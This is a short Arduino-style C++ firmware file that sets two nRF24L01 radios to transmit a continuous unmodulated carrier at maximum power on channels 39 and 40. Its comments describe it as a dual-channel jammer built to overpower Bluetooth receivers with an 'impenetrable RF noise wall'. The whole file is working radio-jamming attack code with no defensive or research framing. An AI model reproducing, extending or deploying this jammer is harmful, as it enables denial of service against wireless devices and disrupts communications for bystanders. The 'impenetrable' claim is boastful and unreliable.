#include "attack.h"
#include "radio.h"

static int attack_counter = 0;

void attack_init() {
    Serial.println(F("[ATTACK] Static High-Power Dual-Channel Carrier Jammer Initialized"));
}

void attack_run_step(int& counter) {
    if (!radios_ready()) {
        return;
    }

    RF24& r1 = get_radio_1();
    RF24& r2 = get_radio_2();

    // Lock radios permanently onto core ISM/Bluetooth center channels (Ch 39 and Ch 40)
    // with continuous unmodulated carrier wave at maximum amplifier power (PA_MAX).
    // This creates an impenetrable RF noise wall that overpowers Bluetooth receiver frontends.
    r1.setChannel(39);
    r2.setChannel(40);

    r1.startConstCarrier(RF24_PA_MAX, 39);
    r2.startConstCarrier(RF24_PA_MAX, 40);

    attack_counter++;
    counter = attack_counter;
}
